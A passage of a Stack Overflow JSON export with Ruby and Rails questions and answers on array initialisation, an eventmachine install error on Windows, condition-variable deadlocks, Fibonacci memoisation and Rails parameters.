"https://stackoverflow.com/questions/52069227/create-multiple-arrays-in-one-line/52070342#52070342", "title": "Create multiple arrays in one line", "body": "<p>This is mentioned <a href=\"https://ruby-doc.org/core-2.2.0/Array.html#method-c-new-label-Common+gotchas\" rel=\"nofollow noreferrer\">here</a>:</p>\n\n<blockquote>\n  <p>When sending the second parameter (to <code>Array.new</code>), the same object will be used as the value for all the array elements:</p>\n</blockquote>\n\n<p>So, as @mudasobwa already suggested in the comments, you need to use the block version which uses the result of block for each element:</p>\n\n<pre><code>a, b = Array.new(2) { [0, 0] }\n =&gt; [[0, 0], [0, 0]]\n\na[0] = 1\n\na\n =&gt; [1, 0]\n\nb\n =&gt; [0, 0]\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 8118674, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-t-ln1UxyN8U/AAAAAAAAAAI/AAAAAAAAAN0/lgrqqWjzj-M/photo.jpg?sz=128", "display_name": "Giuse Trieu", "link": "https://stackoverflow.com/users/8118674/giuse-trieu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 728, "favorite_count": 0, "accepted_answer_id": 52070342, "answer_count": 1, "score": 0, "last_activity_date": 1535522023, "creation_date": 1535514905, "last_edit_date": 1535520128, "question_id": 52069227, "link": "https://stackoverflow.com/questions/52069227/create-multiple-arrays-in-one-line", "title": "Create multiple arrays in one line", "body": "<p>I did:</p>\n\n<pre><code>a, b = Array.new(2, [0, 0])\na[0] = 1\n</code></pre>\n\n<p>I have:</p>\n\n<pre><code>a # =&gt; [1, 0]\n</code></pre>\n\n<p>I have a problem with <code>b</code>, which is the same as <code>a</code>:</p>\n\n<pre><code>b # =&gt; [1, 0]\n</code></pre>\n\n<p>The problem is reference address.</p>\n\n<p>Help me initialize array in one line.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-3", "ruby-on-rails-4"], "comments": [{"owner": {"reputation": 893, "user_id": 3394889, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a3c58b23ce03f0e71522820d13404d5a?s=128&d=identicon&r=PG&f=1", "display_name": "The Wizard", "link": "https://stackoverflow.com/users/3394889/the-wizard"}, "edited": false, "score": 0, "creation_date": 1535514060, "post_id": 52068939, "comment_id": 91088113, "body": "Have you got eventmachine in your Gemfile?"}, {"owner": {"reputation": 1, "user_id": 10287648, "user_type": "registered", "profile_image": "https://graph.facebook.com/2024277380944151/picture?type=large", "display_name": "Mandy Saini", "link": "https://stackoverflow.com/users/10287648/mandy-saini"}, "reply_to_user": {"reputation": 893, "user_id": 3394889, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a3c58b23ce03f0e71522820d13404d5a?s=128&d=identicon&r=PG&f=1", "display_name": "The Wizard", "link": "https://stackoverflow.com/users/3394889/the-wizard"}, "edited": false, "score": 0, "creation_date": 1535514264, "post_id": 52068939, "comment_id": 91088143, "body": "No, I don&#39;t see it in my gemfile"}, {"owner": {"reputation": 893, "user_id": 3394889, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a3c58b23ce03f0e71522820d13404d5a?s=128&d=identicon&r=PG&f=1", "display_name": "The Wizard", "link": "https://stackoverflow.com/users/3394889/the-wizard"}, "edited": false, "score": 0, "creation_date": 1535514310, "post_id": 52068939, "comment_id": 91088153, "body": "add <code>gem &quot;eventmachine&quot;</code> to your Gemfile and run bundle install."}, {"owner": {"reputation": 1, "user_id": 10287648, "user_type": "registered", "profile_image": "https://graph.facebook.com/2024277380944151/picture?type=large", "display_name": "Mandy Saini", "link": "https://stackoverflow.com/users/10287648/mandy-saini"}, "reply_to_user": {"reputation": 893, "user_id": 3394889, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a3c58b23ce03f0e71522820d13404d5a?s=128&d=identicon&r=PG&f=1", "display_name": "The Wizard", "link": "https://stackoverflow.com/users/3394889/the-wizard"}, "edited": false, "score": 0, "creation_date": 1535514570, "post_id": 52068939, "comment_id": 91088208, "body": "Did that but now when i try to rake db:migrate it throws this error LoadError: cannot load such file -- 2.4/rubyeventmachine C:/promotracks-rails/config/application.rb:7:in <code>&lt;top (required)&gt;&#39; C:&#47;promotracks-rails&#47;Rakefile:4:in </code>&lt;top (required)&gt;&#39; (See full trace by running task with --trace)"}, {"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535517615, "post_id": 52068939, "comment_id": 91088969, "body": "Can you try running it as <code>gem install eventmachine --platform ruby</code>"}, {"owner": {"reputation": 1, "user_id": 10287648, "user_type": "registered", "profile_image": "https://graph.facebook.com/2024277380944151/picture?type=large", "display_name": "Mandy Saini", "link": "https://stackoverflow.com/users/10287648/mandy-saini"}, "edited": false, "score": 0, "creation_date": 1535517966, "post_id": 52068939, "comment_id": 91089050, "body": "it gives same error"}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 10287648, "user_type": "registered", "profile_image": "https://graph.facebook.com/2024277380944151/picture?type=large", "display_name": "Mandy Saini", "link": "https://stackoverflow.com/users/10287648/mandy-saini"}, "is_accepted": false, "score": 0, "last_activity_date": 1535594373, "creation_date": 1535594373, "answer_id": 52088251, "question_id": 52068939, "link": "https://stackoverflow.com/questions/52068939/guidance-to-setup-the-local-server-for-existing-ror-app-on-windows/52088251#52088251", "title": "Guidance to setup the local server for existing ROR app on Windows", "body": "<p>Gist of it Rails app are not compatible with windows environment so just switch to mac or linux.</p>\n"}, {"tags": [], "owner": {"reputation": 2471, "user_id": 8063597, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/41fe33a379a7894b9246569a6e0396aa?s=128&d=identicon&r=PG&f=1", "display_name": "Rohan", "link": "https://stackoverflow.com/users/8063597/rohan"}, "is_accepted": false, "score": 0, "last_activity_date": 1535602198, "creation_date": 1535602198, "answer_id": 52089102, "question_id": 52068939, "link": "https://stackoverflow.com/questions/52068939/guidance-to-setup-the-local-server-for-existing-ror-app-on-windows/52089102#52089102", "title": "Guidance to setup the local server for existing ROR app on Windows", "body": "<p>As per the logs shared in the post:</p>\n\n<p>Although eventmachine is provided as x64-mingw platform gem, it doesn't support ruby-2.4 or 2.5 earlier which is fixed now . So would recommend you to do the following:</p>\n\n<p>Firstly, (on Windows + Ruby 2.4) to make sure you remove all versions of eventmachine e.g.</p>\n\n<pre><code>gem uninstall eventmachine\n</code></pre>\n\n<p>Then reinstall using the below mentioned command: </p>\n\n<pre><code>gem install eventmachine --platform ruby\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10287648, "user_type": "registered", "profile_image": "https://graph.facebook.com/2024277380944151/picture?type=large", "display_name": "Mandy Saini", "link": "https://stackoverflow.com/users/10287648/mandy-saini"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 63, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1535602198, "creation_date": 1535512345, "last_edit_date": 1535513549, "question_id": 52068939, "link": "https://stackoverflow.com/questions/52068939/guidance-to-setup-the-local-server-for-existing-ror-app-on-windows", "title": "Guidance to setup the local server for existing ROR app on Windows", "body": "<p>I am new to ROR and I'm trying to run the existing rails app on local server. But somehow it fails when I'm trying to migrate the db. See the full trace below </p>\n\n<blockquote>\n  <p>rake aborted! LoadError: cannot load such file -- eventmachine C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/activesupport-5.0.7/lib/active_support/dependencies.rb:293:in <code>require'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/activesupport-5.0.7/lib/active_support/dependencies.rb:293:in</code>block in require'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/activesupport-5.0.7/lib/active_support/dependencies.rb:259:in <code>load_dependency'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/activesupport-5.0.7/lib/active_support/dependencies.rb:293:in</code>require'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/thin-1.7.2/lib/thin.rb:7:in <code>&lt;top (required)&gt;'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/bundler-1.16.4/lib/bundler/runtime.rb:81:in</code>require'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/bundler-1.16.4/lib/bundler/runtime.rb:81:in <code>block (2 levels) in require'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/bundler-1.16.4/lib/bundler/runtime.rb:76:in</code>each'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/bundler-1.16.4/lib/bundler/runtime.rb:76:in <code>block in require'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/bundler-1.16.4/lib/bundler/runtime.rb:65:in</code>each'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/bundler-1.16.4/lib/bundler/runtime.rb:65:in <code>require'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/bundler-1.16.4/lib/bundler.rb:114:in</code>require'\n  C:/promotracks-rails/config/application.rb:7:in <code>&lt;top (required)&gt;'\n  C:/Ruby24-x64/lib/ruby/2.4.0/rubygems/core_ext/kernel_require.rb:55:in</code>require'\n  C:/Ruby24-x64/lib/ruby/2.4.0/rubygems/core_ext/kernel_require.rb:55:in <code>require'\n  C:/promotracks-rails/Rakefile:4:in</code>'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/rake_module.rb:29:in <code>load'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/rake_module.rb:29:in</code>load_rakefile'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/application.rb:703:in <code>raw_load_rakefile'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/application.rb:104:in</code>block in load_rakefile'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/application.rb:186:in <code>standard_exception_handling'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/application.rb:103:in</code>load_rakefile'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/application.rb:82:in <code>block in run'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/application.rb:186:in</code>standard_exception_handling'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/lib/rake/application.rb:80:in <code>run'\n  C:/Ruby24-x64/lib/ruby/gems/2.4.0/gems/rake-12.3.1/exe/rake:27:in</code>'\n  C:/Ruby24-x64/bin/rake:23:in <code>load'\n  C:/Ruby24-x64/bin/rake:23:in</code>'</p>\n</blockquote>\n\n<p>(I have ruby, rails, gem and bundler installed)</p>\n"}, {"tags": ["ruby", "multithreading", "thread-safety", "signals", "deadlock"], "answers": [{"comments": [{"owner": {"reputation": 59, "user_id": 4839010, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1aa220e75c57b716a61f2f37702bb72e?s=128&d=identicon&r=PG&f=1", "display_name": "aMat", "link": "https://stackoverflow.com/users/4839010/amat"}, "edited": false, "score": 0, "creation_date": 1535587835, "post_id": 52072561, "comment_id": 91125505, "body": "Casper, thank you so much for this detailed awesome response and solution!   You are totally correct -- The signal_thread is firing first and the waiting_thread is just left to wait forever (causing the deadlock!). My only question with this new solution is why ever use <code>ConditionVariables</code> when <code>Thread::Queue</code>s do the same thing but better?"}, {"owner": {"reputation": 30418, "user_id": 823617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmWH1.png?s=128&g=1", "display_name": "Casper", "link": "https://stackoverflow.com/users/823617/casper"}, "reply_to_user": {"reputation": 59, "user_id": 4839010, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1aa220e75c57b716a61f2f37702bb72e?s=128&d=identicon&r=PG&f=1", "display_name": "aMat", "link": "https://stackoverflow.com/users/4839010/amat"}, "edited": false, "score": 0, "creation_date": 1535641932, "post_id": 52072561, "comment_id": 91151334, "body": "That&#39;s a very good question, but I think you get the answer once I tell you that <code>Queue</code> is basically implemented using condition variables (it&#39;s implemented in C-code, but it uses a condition variable-type implementation internally). Think of condition variables as the most basic thread control element, and then you can build more advanced implementations on top of that, like <code>Queue</code>. I think this article will give you some nice ideas: <a href=\"https://vaneyckt.io/posts/ruby_concurrency_in_praise_of_condition_variables/\" rel=\"nofollow noreferrer\">vaneyckt.io/posts/&hellip;</a>"}, {"owner": {"reputation": 30418, "user_id": 823617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmWH1.png?s=128&g=1", "display_name": "Casper", "link": "https://stackoverflow.com/users/823617/casper"}, "reply_to_user": {"reputation": 59, "user_id": 4839010, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1aa220e75c57b716a61f2f37702bb72e?s=128&d=identicon&r=PG&f=1", "display_name": "aMat", "link": "https://stackoverflow.com/users/4839010/amat"}, "edited": false, "score": 0, "creation_date": 1535642179, "post_id": 52072561, "comment_id": 91151501, "body": "Also note that <code>Queue</code> does not implement a timeout, which is available with <code>ConditionVariable</code>. However that does not mean you couldn&#39;t create your own <code>Queue</code> which would implement a timeout. But again you would most likely end up using condition variables internally for that."}, {"owner": {"reputation": 30418, "user_id": 823617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmWH1.png?s=128&g=1", "display_name": "Casper", "link": "https://stackoverflow.com/users/823617/casper"}, "reply_to_user": {"reputation": 59, "user_id": 4839010, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1aa220e75c57b716a61f2f37702bb72e?s=128&d=identicon&r=PG&f=1", "display_name": "aMat", "link": "https://stackoverflow.com/users/4839010/amat"}, "edited": false, "score": 0, "creation_date": 1535642552, "post_id": 52072561, "comment_id": 91151756, "body": "Example of a <code>Queue</code> implementation with timeout: <a href=\"https://spin.atomicobject.com/2017/06/28/queue-pop-with-timeout-fixed/\" rel=\"nofollow noreferrer\">spin.atomicobject.com/2017/06/28/queue-pop-with-timeout-fixe&zwnj;&#8203;d</a>"}, {"owner": {"reputation": 59, "user_id": 4839010, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1aa220e75c57b716a61f2f37702bb72e?s=128&d=identicon&r=PG&f=1", "display_name": "aMat", "link": "https://stackoverflow.com/users/4839010/amat"}, "edited": false, "score": 0, "creation_date": 1536885452, "post_id": 52072561, "comment_id": 91594220, "body": "These are great reads -- thanks a lot! (Going to share this information at a code review session !)"}], "tags": [], "owner": {"reputation": 30418, "user_id": 823617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmWH1.png?s=128&g=1", "display_name": "Casper", "link": "https://stackoverflow.com/users/823617/casper"}, "is_accepted": true, "score": 1, "last_activity_date": 1535548552, "last_edit_date": 1535548552, "creation_date": 1535530182, "answer_id": 52072561, "question_id": 52068527, "link": "https://stackoverflow.com/questions/52068527/simple-thread-conditional-variable-example-giving-deadlock-in-ruby/52072561#52072561", "title": "Simple thread conditional variable example giving deadlock in ruby", "body": "<p>I think the code from the Ruby docs can be a bit misleading, because it does not tell you that sending a signal does not buffer anywhere if the receiver is not waiting for it.</p>\n\n<p>So the situation which will result in a deadlock will happen as follows:</p>\n\n<ol>\n<li><p><code>signal_thread</code> enters critical section and calls <code>resource.signal</code>. This signal will be lost. </p></li>\n<li><p><code>signal_thread</code> is done, and exits.</p></li>\n<li><p><code>waiting_thread</code> enters critical section and calls <code>resource.wait</code>. It's now locked waiting for a signal that never comes.</p></li>\n<li><p>All threads are locked or inactive. No more live threads, therefore no one is able to wake up <code>waiting_thread</code> <code>--&gt;</code> deadlock error.</p></li>\n</ol>\n\n<p>You can get a deadlock error randomly on the sample code, depending on your CPU, OS, and the position of the sun or moon, if you just keep running it, because the order of the execution of <code>signal_thread</code> and <code>waiting_thread</code> is not deterministic. The order is random, therefore a deadlock may or may not happen, but it CAN happen depending on the execution order.</p>\n\n<p>Now how do you solve it? Well, you need to guarantee <code>waiting_thread</code> waits, before <code>signal_thread</code> signals. We can do this using a <code>Queue</code>, like so:</p>\n\n<pre><code>mutex = Mutex.new\nresource = ConditionVariable.new\n\nsync_queue = Queue.new\n\nwaiting_thread = Thread.new {\n  mutex.synchronize {\n    puts \"Waiting thread sending sync message...\"\n    sync_queue &lt;&lt; 1\n\n    puts \"Thread 'a' now needs the resource\"\n    resource.wait(mutex)\n    puts \"'a' can now have the resource\"\n    \"a can now have the resource\"\n  }\n}\n\nsignal_thread = Thread.new {\n  puts \"Signal thread waiting for sync...\"\n  # signal_thread will sleep here, until there is something in the queue to pop.\n  # This guarantees the right execution order. \n  sync_queue.pop\n\n  mutex.synchronize {\n    puts \"Thread 'b' has finished using the resource\"\n    resource.signal\n  }\n}\n\nwaiting_thread.value\n</code></pre>\n\n<p>Now the code is deterministic, and <code>waiting_thread</code> will always wait before <code>signal_thread</code> signals, and the code will work as expected.</p>\n\n<p>You just have to be aware that the <code>signal</code> call of a condition variable goes up in smoke if nobody is waiting on the other end. I think this important information is missing from the docs.</p>\n\n<p>In addition to that the resource example is not really a very good example of checking if a resource is available in a critical section, because of this problem. If <code>signal_thread</code> already used the resource, then <code>waiting_thread</code> will never know it. </p>\n\n<p>In a real situation there needs to be additional data shared between the threads, so that one thread can check if a resource is in use, and only THEN wait for a signal. If the resource is not already in use, then waiting for the signal is not needed, and in fact should not be done at all.</p>\n\n<p>I.e. the ConditionVariable should not be used for checking resource state, only for signaling. In that case we are using condition variables more appropriately.</p>\n"}], "owner": {"reputation": 59, "user_id": 4839010, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1aa220e75c57b716a61f2f37702bb72e?s=128&d=identicon&r=PG&f=1", "display_name": "aMat", "link": "https://stackoverflow.com/users/4839010/amat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 282, "favorite_count": 0, "accepted_answer_id": 52072561, "answer_count": 1, "score": 2, "last_activity_date": 1535548552, "creation_date": 1535508583, "question_id": 52068527, "link": "https://stackoverflow.com/questions/52068527/simple-thread-conditional-variable-example-giving-deadlock-in-ruby", "title": "Simple thread conditional variable example giving deadlock in ruby", "body": "<p>Hi I am toying around with threads and condition variables in ruby and I'm getting some very confusing results which don't make sense. I am following the <a href=\"http://ruby-doc.org/stdlib-2.0.0/libdoc/thread/rdoc/ConditionVariable.html\" rel=\"nofollow noreferrer\">ConditionVariable example</a> from the ruby docs and everything seems to go as planned: </p>\n\n<pre><code>mutex = Mutex.new\nresource = ConditionVariable.new\n\nwaiting_thread = Thread.new {\n  mutex.synchronize {\n    puts \"Thread 'a' now needs the resource\"\n    resource.wait(mutex)\n    puts \"'a' can now have the resource\"\n    \"a can now have the resource\"\n  }\n}\n\nsignal_thread = Thread.new {\n  mutex.synchronize {\n    puts \"Thread 'b' has finished using the resource\"\n    resource.signal\n  }\n}\n</code></pre>\n\n<p>This when running this code I get very expected output: </p>\n\n<pre><code>=&gt; Thread 'a' now needs the resource\n=&gt; Thread 'b' has finished using the resource\n=&gt; 'a' can now have the resource\n</code></pre>\n\n<p>However the MOMENT I change it up a bit to <code>join</code> or get the <code>value</code> from the <code>waiting_thread</code>, it blows up with a <code>Deadlock</code> fatal error. </p>\n\n<pre><code>waiting_thread.value\nsignal_thread\n</code></pre>\n\n<p>Outputs:</p>\n\n<blockquote>\n  <p>= Failure/Error: waiting_thread.value --\n         No live threads left. Deadlock?</p>\n</blockquote>\n\n<p>I can vaguely understand what is happening -- both are trying to synchronize on the same mutex when the <code>waiting_thread</code> is indefinitely locked. </p>\n\n<p>But in that case, why does the initial code work flawlessly giving the <code>put</code> statements in an expected asynchronous result? </p>\n\n<p>This is somewhat important not only for my understanding but to toy around with concurrent testing. How can I use <code>join</code> and <code>value</code> with <code>ConditionVariables</code> to produce what I'm looking for?</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 0, "creation_date": 1535508785, "post_id": 52068521, "comment_id": 91087084, "body": "Check for example: <a href=\"https://stackoverflow.com/questions/24438655/ruby-fibonacci-algorithm\" title=\"ruby fibonacci algorithm\">stackoverflow.com/questions/24438655/ruby-fibonacci-algorith&zwnj;&#8203;m</a>"}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1535520302, "post_id": 52068521, "comment_id": 91089765, "body": "What is CW? ......."}, {"owner": {"reputation": 479, "user_id": 4496701, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh5.googleusercontent.com/-SST61v329Q0/AAAAAAAAAAI/AAAAAAAAAFM/ihwdZ1nZE7Q/photo.jpg?sz=128", "display_name": "Cliff Stamp", "link": "https://stackoverflow.com/users/4496701/cliff-stamp"}, "edited": false, "score": 0, "creation_date": 1535521095, "post_id": 52068521, "comment_id": 91090051, "body": "CW is codewars, programming site."}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1535522345, "post_id": 52068521, "comment_id": 91090513, "body": "Don&#39;t assume that everyone knows that."}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "reply_to_user": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1535522468, "post_id": 52068521, "comment_id": 91090559, "body": "@sawa you mean it should be <i>&quot;which I solved&quot;</i>?"}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1535522554, "post_id": 52068521, "comment_id": 91090595, "body": "Of course. As I have edited before your edit."}, {"owner": {"reputation": 479, "user_id": 4496701, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh5.googleusercontent.com/-SST61v329Q0/AAAAAAAAAAI/AAAAAAAAAFM/ihwdZ1nZE7Q/photo.jpg?sz=128", "display_name": "Cliff Stamp", "link": "https://stackoverflow.com/users/4496701/cliff-stamp"}, "edited": false, "score": 0, "creation_date": 1535589312, "post_id": 52068521, "comment_id": 91125764, "body": "iGian, thanks for the link, the above is what I am up with after that link and a few others. It works, is performant, but is just hacky."}], "answers": [{"comments": [{"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 1, "creation_date": 1535576864, "post_id": 52069336, "comment_id": 91122494, "body": "Note that <code>RubyVM</code> is a private internal implementation detail of YARV, and will not work on MRI (which some tutorials still use), JRuby, IronRuby, Rubinius, MagLev, or Opal. Also note that neither the Ruby Language Specification, nor RubySpec, nor Programming Ruby, nor the RDoc documentation guarantee TCO."}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": false, "score": 0, "last_activity_date": 1535515692, "creation_date": 1535515692, "answer_id": 52069336, "question_id": 52068521, "link": "https://stackoverflow.com/questions/52068521/fibonacci-with-ruby/52069336#52069336", "title": "Fibonacci with Ruby", "body": "<p>If you enable tail call optimization in Ruby, you might achieve the same result recursively, which is faster, less memory consuming and more elegant.</p>\n\n<pre><code>RubyVM::InstructionSequence.compile_option = {\n  tailcall_optimization: true,  \n  trace_instruction: false  \n}\n\ndef fib(curr = 1, acc = 0, n)\n  n &lt;= 0 ? acc : fib(acc, curr + acc, n - 1)\nend\n\nfib(100_000).to_s.length\n#\u21d2 20899\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1535528880, "post_id": 52072048, "comment_id": 91093925, "body": "Nice way of using <code>default_proc</code>."}], "tags": [], "owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "is_accepted": false, "score": 1, "last_activity_date": 1535528761, "last_edit_date": 1535528761, "creation_date": 1535528414, "answer_id": 52072048, "question_id": 52068521, "link": "https://stackoverflow.com/questions/52068521/fibonacci-with-ruby/52072048#52072048", "title": "Fibonacci with Ruby", "body": "<blockquote>\n  <p>Is there a cleaner way to do this?</p>\n</blockquote>\n\n<p>You can assign a <a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-default_proc\" rel=\"nofollow noreferrer\"><code>default_proc</code></a> to calculate missing hash values dynamically:</p>\n\n<pre><code>fib = { 0 =&gt; 0, 1 =&gt; 1 }\nfib.default_proc = -&gt;(f, n) { f[n] = f[n-1] + f[n-2] }\n\nfib[10]\n#=&gt; 55\n\nfib\n#=&gt; {0=&gt;0, 1=&gt;1, 2=&gt;1, 3=&gt;2, 4=&gt;3, 5=&gt;5, 6=&gt;8, 7=&gt;13, 8=&gt;21, 9=&gt;34, 10=&gt;55}\n</code></pre>\n\n<p>Note that this approach is limited by Ruby's stack size.</p>\n"}], "owner": {"reputation": 479, "user_id": 4496701, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh5.googleusercontent.com/-SST61v329Q0/AAAAAAAAAAI/AAAAAAAAAFM/ihwdZ1nZE7Q/photo.jpg?sz=128", "display_name": "Cliff Stamp", "link": "https://stackoverflow.com/users/4496701/cliff-stamp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 97, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1535528761, "creation_date": 1535508516, "last_edit_date": 1535522191, "question_id": 52068521, "link": "https://stackoverflow.com/questions/52068521/fibonacci-with-ruby", "title": "Fibonacci with Ruby", "body": "<p><a href=\"https://www.codewars.com/kata/fibonacci-reloaded/ruby\" rel=\"nofollow noreferrer\">This</a> was a problem, which i solved:</p>\n\n<pre><code>@cache={}\n@cache[1]=0\n@cache[2]=1\n\ndef fib(n)\n  @fibs[n-1]\nend\n\ndef fib_m(n)\n  @cache[n] ||= fib_m(n-1) + fib_m(n-2)\nend\n\n@fibs=[]\n@fibs=(1..100000).map{|n| fib_m(n)}\n</code></pre>\n\n<p>But this looks hacky. It seems like I am doubling the caching, and I have to hard code some upper limit. Is there a cleaner way to do this?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "parameters", "ruby-on-rails-5"], "comments": [{"owner": {"reputation": 613, "user_id": 4580814, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/027bad725fb46b84a2499611073a2ff9?s=128&d=identicon&r=PG&f=1", "display_name": "Abass Sesay", "link": "https://stackoverflow.com/users/4580814/abass-sesay"}, "edited": false, "score": 0, "creation_date": 1535508706, "post_id": 52068411, "comment_id": 91087066, "body": "You can add a pry to the controller to see what values are in <code>params</code> - <a href=\"https://github.com/pry/pry\" rel=\"nofollow noreferrer\">github.com/pry/pry</a>"}, {"owner": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "edited": false, "score": 0, "creation_date": 1535509657, "post_id": 52068411, "comment_id": 91087269, "body": "Just tried on one of my projects and <code>remote: true</code> with <code>method: :get</code> works just fine. Actually, on your logs, the second shows the parameter and it&#39;s processed as JS (which looks like a <code>remote: true</code> request but you say it&#39;s not remote), and the first one without the parameters looks like a simple html request (without <code>remote</code>). Also, there&#39;s another <code>search</code> parameter, does it come from the button? why are you setting <code>name: nil</code> on it?"}, {"owner": {"reputation": 27, "user_id": 3499671, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Uos2y.png?s=128&g=1", "display_name": "Jumping Jack", "link": "https://stackoverflow.com/users/3499671/jumping-jack"}, "edited": false, "score": 0, "creation_date": 